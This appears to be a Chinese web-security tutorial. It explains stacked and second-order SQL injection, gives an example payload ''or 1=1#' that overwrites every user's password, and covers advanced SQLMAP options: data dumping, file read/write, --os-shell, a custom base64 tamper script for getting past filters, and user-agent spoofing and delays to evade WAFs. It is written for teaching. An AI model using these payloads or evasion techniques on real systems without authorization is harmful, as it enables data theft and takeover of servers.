---
title: SQL注入&二次攻击&堆叠执行&SQLMAP&Tamper编写&指纹修改&分析调试
published: 2026-06-24T12:00:00
description: 堆叠与二次注入原理及利用条件。深入SQLMAP高级功能，包括数据猜解、文件命令操作、多提交方式，以及Tamper脚本的定制（如Base64编码适配）和代理调试、指纹混淆等进阶技巧。
tags:
  - Web攻防
  - SQL注入
category: 网络安全
draft: false
---

# 知识点

1. Web攻防-SQL注入-堆叠&二次注入
2. Web攻防-SQL注入-SQLMAP进阶使用

# 堆叠注入

堆叠注入触发的条件很苛刻，因为堆叠注入原理就是通过结束符同时执行多条sql语句，例如php中的`mysqli_multi_query`函数。与之相对应的`mysqli_query()`只能执行一条SQL，所以要想目标存在堆叠注入,在目标主机存在类似于`mysqli_multi_query()`这样的函数，根据数据库类型决定是否支持多条语句执行。

1. 目标存在sql注入漏洞
2. 目标未对";"号进行过滤
3. 目标中间层查询数据库信息时可同时执行多条sql语句

支持堆叠数据库：MYSQL、MSSQL、Postgresql等

比如执行sql语句为

```sql
-- 分号未被过滤，可以正常执行
select * from 'admin' where id=1;show DATABASE;
```

若结果出现两条，则说明都执行了

在php代码中经常出现以下两种：

```php
// 会造成堆叠注入的函数调用
mysqli_multi_query()

// 不会造成堆叠注入
mysqli_query()
```

# 二次注入

原理：注册（写入payload）-登录后修改-修改时以当前用户名为条件触发，也就是第一次是带入恶意数据，第二次是执行

黑盒思路：分析功能有添加后对数据操作的地方（功能点）

白盒思路：insert后进入select或update的功能的代码块

注入条件：插入时有转义函数或配置，后续有利用插入的数据

想象一个场景：

```
1. 注册界面 注册用户
   用户 username = 注入payload语句 比如：'or 1=1#
2. 登录界面 返回用户中心
3. 用户中心修改用户信息
   修改 对象 是谁 谁是什么东西决定的
   以用户名为主当条件 = 谁
   除此之外还有多种情况，大多数都是以id作为条件
   
因为注册时，已经把注入语句作为用户名来进行注册
所以当在执行修改功能比如：
update user set password = 'xxx',email = 'xxx@xx.com' where username = 'user1';(正常修改行为)
update user set password = 'xxx',email = 'xxx@xx.com' where username = ''or 1=1#';(存在二次注入行为)
因此在进行修改时，就会触发这个已存在的注入点

二次注入原理就是分了两步：
1. 插入恶意数据
2. 引用恶意数据
```

## 分析sql语句

```sql
update user set password = '12345678',email = 'aaa111@qq.com' where username = ''or 1=1#';
```

这里会**匹配用户名为空的记录**，如果表里没有任何`username = ''`的用户`WHERE username = '' OR 1=1`因为`OR 1=1`的存在，**依然会匹配所有行**。

因此如果执行成功的话会造成所有用户的密码和邮箱全部修改为`12345678 aaa111@qq.com`。

# SqlMap

参考：[SqlMap笔记](https://www.cnblogs.com/bmjoker/p/9326258.html)

## 数据猜解-库表列数据&字典

常规数据获取

```bash
--current-db

--tables -D "数据库名"

--columns -T "表名" -D "数据库名"

 --dump -C "字段1,字段2" -T "表名" -D "数据库名"
```

### 跨库注入

```bash
--dbs # 获取所有数据库名，后续操作同上
```
## 权限操作-文件&命令&交互式

### 引出权限大小

```bash
--is-dba
--privileges
```

### 引出文件

```bash
# 读
--file-read
# 写
--file-write --file-dest
```

### 引出命令

```bash
# 命令执行
--os-cmd=命令
# 交互式命令
--os-shell
# 执行sql语句
--sql-shell
```

## 提交方法-POST&HEAD&JSON

### 数据包注入

将整个请求头放到txt文件，并且使用星号`*`来指定注入点。

推荐使用的原因：

1. 访问不可达。（一些网站限制只有完整的数据包才能访问，否则有可能直接拒绝请求）
2. 带有用户凭据类的数据包。

```bash
-r 1.txt # 指定注入点可以参考cookie，还有具体数据，比如json格式的数据，UA头注入等
```

### Post

```bash
--data "数据" # 比如 --data "username=111&password=123"
```

### Cookie

代码中sql查询的是`user_id`，指定`*`就表示注入点在这里

```bash
--cookie "" # 比如 -- cookie "user_id=1*"
```

### Json

```bash
-r 1.txt
```

## 绕过模块-Tamper脚本-使用&开发

### base64注入

```bash
--tamper=base64encode.py # sqlmap自带,后缀写不写都可以
```

### base64+json注入

数据包修改json的数据

```json
{"id":0,"keyword":"*"} // 注入点给到keyword
```

```bash
-r 1.txt --tamper=base64encode
```

### base64+json注入&再加有过滤的注入

使用`encodeBase64`对payload进行编码，保存文件为`test.py`

这里只是已知过滤条件，实际上需要知道是什么样的过滤，再调整代码部分，配合burpsuite使用

```python
from lib.core.convert import encodeBase64

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():

pass

def tamper(payload, **kwargs):

	if payload:

		payload = payload.replace('SELECT','sElEct')

		payload = payload.replace('select','sElEct')

		payload = payload.replace('OR','Or')

		payload = payload.replace('or','Or')

		payload = payload.replace('AND','And')

		payload = payload.replace('and','And')

		payload = payload.replace('XOR','xOr')

		payload = payload.replace('xor','xOr')

		payload = payload.replace('SLEEP','SleeP')

		payload = payload.replace('sleep','SleeP')

		payload = payload.replace('ELT','Elt')

	return encodeBase64(payload, binary=False) if payload else payload
```

```bash
--tamper=test.py
```

## 分析拓展-代理&调试&指纹&风险&等级

### 后期分析调试

#### 显示调试信息

```bash
-v 0-6 # 详细的等级(0-6)
0、只显示python错误以及严重的信息。
1、同时显示基本信息和警告信息。（默认）
2、同时显示debug信息。
3、同时显示注入的payload。
4、同时显示HTTP请求。
5、同时显示HTTP响应头。
6、同时显示HTTP响应页面。

```

#### 联动代理进行调试分析

发包到burpsuite联合使用

```bash
--proxy "http://xx:xx" # 代理注入
--proxy "http://127.0.0.1:8080" 
--proxy=http://127.0.0.1:1080
```

### 打乱默认指纹

#### 绕过流量设备识别sqlmap-自定义user-agent

```bash
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www/baidu.com/search/spider.html)
```

#### 绕过流量设备识别sqlmap-随机user-agent

```bash
--random-agent
```

#### 绕过流量设备识别sqlmap-设定两个HTTP 请求的间隔时间

```bash
--delay # 默认是没有任何间隔，有waf的话，会直接拦截，因为sqlMAP在一瞬间发包量很大，WAF会认为是DD攻击，这个时候就可以利用这个参数绕过或者直接修改SQLMAP的user-agent
--time-sec=(2,5) # 延迟响应，默认为5
```

### 使用更多方式类型注入

#### 执行的测试水平等级

```bash
--level 1-5
# 默认是1，cookie需要等级2，HTTP头注入要3以上才行，如果前三个等级都没有找到有效的注入点，可以考虑使用Level 4和Level 5进行更全面的探测。这些等级会使用更多的payload和复杂的注入技术，如联合查询注入、堆叠查询注入等
```

#### 执行的测试风险等级

```bash
--risk= 1-3
# 共有3个等级，对测试的语句有影响，默认为1 
```